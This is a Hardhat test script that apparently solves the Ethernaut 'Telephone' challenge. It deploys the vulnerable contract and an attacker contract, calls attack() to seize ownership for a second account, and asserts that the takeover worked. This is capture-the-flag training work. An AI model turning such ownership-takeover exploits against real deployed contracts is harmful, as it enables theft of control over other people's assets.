// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const { expect } = require("chai");

async function main() {
    // Hardhat always runs the compile task when running scripts with its command
    // line interface.
    //
    // If this script is run directly using `node` you may want to call compile
    // manually to make sure everything is compiled
    // await hre.run('compile');

    // We get the contract to deploy

    Telephone = await hre.ethers.getContractFactory("contracts/Telephone.sol:Telephone");
    const tl = await Telephone.deploy();
    await tl.deployed();

    TelephoneAtt = await hre.ethers.getContractFactory("TelephoneAtt");
    const tla = await TelephoneAtt.deploy();
    await tla.deployed();

    const signers = await hre.ethers.getSigners()
    const attackTx = await tla.attack(tl.address, signers[1].address);
    await attackTx.wait();

    expect((await tl.owner())).to.equal(signers[1].address);
}


// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
